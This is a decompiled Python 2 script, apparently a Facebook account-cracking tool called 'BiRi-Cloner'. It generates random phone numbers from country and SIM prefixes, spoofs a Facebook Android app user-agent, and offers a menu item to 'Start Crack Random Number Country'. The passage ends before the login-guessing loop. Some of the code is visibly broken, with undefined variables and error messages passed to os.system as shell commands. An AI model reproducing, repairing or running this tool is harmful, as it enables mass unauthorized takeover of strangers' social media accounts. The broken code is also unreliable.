# Decompile by Xn0r3 with Decompyle++
# File: biri.patched.pyc (Python 2.7)

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')


try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 biriclone.py')

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36')]
br.addheaders = [
    ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/64.64.121.87;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
    
    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
    


def tik():
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)
    


def cp(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.3)
    


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
    

back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo = '\n\x1b[1;91m             \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;93m             \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;92m             \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;95m             \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;91m             \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n                   \xf0\x9f\x9a\xac \xf0\x9f\x92\x93\xf0\x9f\x9a\xac \xf0\x9f\x92\x93\xf0\x9f\x9a\xac\xf0\x9f\x92\x93\xf0\x9f\x9a\xac \n\x1b[1;97m             \n\x1b[1;93m           \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;93m           \xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m           \xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88                   \n\x1b[1;91m           \xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\n\x1b[1;93m--------------------------------------------------------------\n\x1b[1;92m\xe2\x9e\xa3 Modified By :  \xf0\x9f\x92\x97 BiRi_B@B@ \xf0\x9f\x92\x97\n\x1b[1;91m\xe2\x9e\xa3 CYBER NAME  :  \xf0\x9f\x92\xa3BiRi-Cloner \xf0\x9f\x92\xa3\n\x1b[1;93m\xe2\x9e\xa3 WHATSAPP NO :  \xf0\x9f\x91\xac prem korba? \xf0\x9f\x91\xac\n\x1b[1;95m\xe2\x9e\xa3 WARNING     :  \xf0\x9f\x9a\xac BiRi is injurious to health\xf0\x9f\x94\xab\n\x1b[1;96m\xe2\x9e\xa3 FUNNY LINE  :  \xf0\x9f\x99\x89Birier put** dis\xf0\x9f\xa4\xad\n\x1b[1;97m\xe2\x9e\xa3 NOTE        :  \xf0\x9f\x92\x95USE Mobile data for better success\xf0\x9f\x92\x95\n\x1b[1;92m\xe2\x9e\xa3 NOTE        :  \xf0\x9f\x91\x8fUSE FAST 4G SIM NET\xf0\x9f\x91\x8f\n\x1b[1;91m\xe2\x9e\xa3 NOTE        :  \xf0\x9f\x8c\x8d 1ST Bishmillah Boila nen\xf0\x9f\x8c\x8d\n\x1b[1;95m\xe2\x9e\xa3 ALL COUNTIRS:  \xf0\x9f\x8c\xb7 Choose Your 3 Password \xf0\x9f\x8c\xb7  \n\x1b[1;93m\xe2\x9e\xa3 DISCLAMIAR  :  \xf0\x9f\x91\x8aDON,T USE  ILLIGAL WAY\xf0\x9f\x91\x8a\n\x1b[1;93m--------------------------------------------------------------\n\x1b[1;92m         \xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;92m         \xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;92m         \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;92m         \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\n\x1b[1;91m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a\n\n\x1b[1;92m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;93m ALLWAYS BE HAPPY \x1b[1;92m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a         \n\x1b[1;93m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;96m STAY WITH THBD\x1b[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a         \n\x1b[1;94m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;95m PRAY FOR ME \x1b[1;94m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a         \n\x1b[1;95m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a\n\x1b[1;93m                      \xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;93m                      \xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;93m                      \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;93m                      \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\n                                '
logoxd = '\n\x1b[1;91m             \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;93m             \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;92m             \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;95m             \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;91m\n                      \xf0\x9f\x9a\xac \xf0\x9f\x92\x93\xf0\x9f\x9a\xac \xf0\x9f\x92\x93\xf0\x9f\x9a\xac\xf0\x9f\x92\x93\xf0\x9f\x9a\xac\n\x1b[1;93m           \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;93m           \xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\n\x1b[1;92m           \xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m           \xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80\n\x1b[1;93m--------------------------------------------------------------\n\x1b[1;92m\xe2\x9e\xa3 Modified By :  \xf0\x9f\x92\x97 BiRi_B@B@ \xf0\x9f\x92\x97\n\x1b[1;91m\xe2\x9e\xa3 CYBER NAME  :  \xf0\x9f\x92\xa3BiRi-Cloner \xf0\x9f\x92\xa3\n\x1b[1;93m\xe2\x9e\xa3 WHATSAPP NO :  \xf0\x9f\x91\xac prem korba? \xf0\x9f\x91\xac\n\x1b[1;95m\xe2\x9e\xa3 WARNING     :  \xf0\x9f\x9a\xac BiRi is injurious to health\xf0\x9f\x94\xab\n\x1b[1;96m\xe2\x9e\xa3 FUNNY LINE  :  \xf0\x9f\x99\x89Birier put** dis\xf0\x9f\xa4\xad\n\x1b[1;97m\xe2\x9e\xa3 NOTE        :  \xf0\x9f\x92\x95USE Mobile data for better success\xf0\x9f\x92\x95\n\x1b[1;92m\xe2\x9e\xa3 NOTE        :  \xf0\x9f\x91\x8fUSE FAST 4G SIM NET\xf0\x9f\x91\x8f\n\x1b[1;91m\xe2\x9e\xa3 NOTE        :  \xf0\x9f\x8c\x8d 1ST Bishmillah Boila nen\xf0\x9f\x8c\x8d\n\x1b[1;95m\xe2\x9e\xa3 ALL COUNTIRS:  \xf0\x9f\x8c\xb7 Choose Your 3 Password \xf0\x9f\x8c\xb7\n\x1b[1;93m\xe2\x9e\xa3 DISCLAMIAR  :  \xf0\x9f\x91\x8aDON,T USE  ILLIGAL WAY\xf0\x9f\x91\x8a\n\x1b[1;93m--------------------------------------------------------------\n\x1b[1;92m         \xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;92m         \xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;92m         \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;92m         \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x92\x96\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\x1b[1;91m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a\n\x1b[1;92m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;93m ALLWAYS BE HAPPY \x1b[1;92m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a         \n\x1b[1;93m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;96m STAY WITH THBD\x1b[1;93m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a         \n\x1b[1;94m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;95m PRAY FOR ME \x1b[1;94m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a         \n\x1b[1;95m\xe2\x96\x88\xe2\x9d\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x9d\x9a\n\x1b[1;93m                      \xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;93m                      \xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;93m                      \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\n\x1b[1;93m                      \xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91(\xc2\xaf`\xf0\x9f\x8c\xb7\xc2\xb4\xc2\xaf)\xe2\x96\x91\xe2\x96\x91\n                                '
cusr = 'birib@b@'
cpwd = 'birib@b@'

def u():
    os.system('clear')
    print logo
    usr = raw_input('\x1b[1;97mUSERNAME TOOL : ')
    if usr == cusr:
        p()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;93mUSERNAME TOOL : ' + usr + ' [\x1b[1;91mWRONG\x1b[1;95m]'
        time.sleep(1)
        u()


def p():
    os.system('clear')
    print logo
    print '\x1b[1;91mUSERNAME TOOL : birib@b@ [\x1b[1;92mCORRECT\x1b[1;97m]'
    pwd = raw_input('\x1b[1;96mPASSWORD TOOL : ')
    if pwd == cpwd:
        z()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;92mUSERNAME TOOL : b@b@biri [\x1b[1;92mCORRECT\x1b[1;97m]'
        print '\x1b[1;91mPASSWORD TOOL : ' + pwd + ' [\x1b[1;91mWRONG\x1b[1;97m]'
        time.sleep(1)
        p()


def z():
    os.system('clear')
    print logo
    print '\x1b[1;93mUSERNAME TOOL : birib@b@ [\x1b[1;92mCORRECT\x1b[1;97m]'
    print '\x1b[1;96mPASSWORD TOOL : birib@b@ [\x1b[1;92mCORRECT\x1b[1;97m]'
    time.sleep(1)
    menu()


def menu():
    os.system('clear')
    print logo
    jalan('  \x1b[1;97m[\x1b[1;92m01\x1b[1;93m]  Start Crack Random Number Country')
    jalan('  \x1b[1;97m[\x1b[1;92m02\x1b[1;95m]  Update Tools')
    jalan('  \x1b[1;97m[\x1b[1;92m00\x1b[1;96m]  Exit')
    avs()


def avs():
    anggaxd = raw_input('\n[\x1b[1;93m?\x1b[1;93m]\x1b[1;96m Choose an Option : \x1b[1;95m')
    if anggaxd == '':
        print '[!] Fill In Correctly'
        avs()
    elif anggaxd == '1' or anggaxd == '01':
        os.system('clear')
        print logo
        print '\x1b[1;92m\xf0\x9f\x91\xacRandom sim Number Clone All Country\xf0\x9f\x91\xac'
        print '\x1b[1;91m-------------------------------------------'
        print '\x1b[1;93m\xf0\x9f\x92\x9aCHOOSE ANY COUNTRY CODE   NUMBER\xf0\x9f\x92\x9a :  '
        print '\x1b[1;95m\xf0\x9f\x92\x9aBANGLADESH\xf0\x9f\x92\x9a  Country code :    +880 '
        print '\x1b[1;96m\xf0\x9f\x92\x9ePAKISTAN\xf0\x9f\x92\x9e Country code    :    +92        '
        print '\x1b[1;97m\xf0\x9f\x92\x97INDIA\xf0\x9f\x90\xae\xf0\x9f\x92\x97  Country code    :    +91   '
        print '\x1b[1;92m\xf0\x9f\xa5\xb0SOUDIA\xf0\x9f\xa5\xb0 County code       :    +966     '
        print '\x1b[1;96m\xf0\x9f\x92\xb5USA\xf0\x9f\x92\xb5  County  code        :    +1   '
        print '\x1b[1;93m\xf0\x9f\x91\x98INDONESIA\xf0\x9f\x91\x98  County code   :    +1    '
        print '\x1b[1;95m\xf0\x9f\x91\x94UK\xf0\x9f\x91\x94  County code          :    +44    '
        print '\x1b[1;91m-------------------------------------------'
        print '\x1b[1;93m\xf0\x9f\x92\x99CHOOSE ANY SIM CODE   NUMBER\xf0\x9f\x92\x9a :'
        print '\x1b[1;95m\xf0\x9f\x92\x9dBANGLADESH\xf0\x9f\x92\x9dSIM code:(175,165,191,192,193,194,)'
        print '\x1b[1;96m\xf0\x9f\x92\x97PAKISTAN\xf0\x9f\x92\x97SIM code:( 313,303,345,333,321,303,)'
        print '\x1b[1;97m\xf0\x9f\x92\xa5INDIA\xf0\x9f\x92\xa5SIM code:( 954,897,967,937,700,727,)'
        print '\x1b[1;92m\xf0\x9f\x92\x91SOUDIA\xf0\x9f\x92\x91SIM code :( 50,51,52,53,54,55,56,57,)'
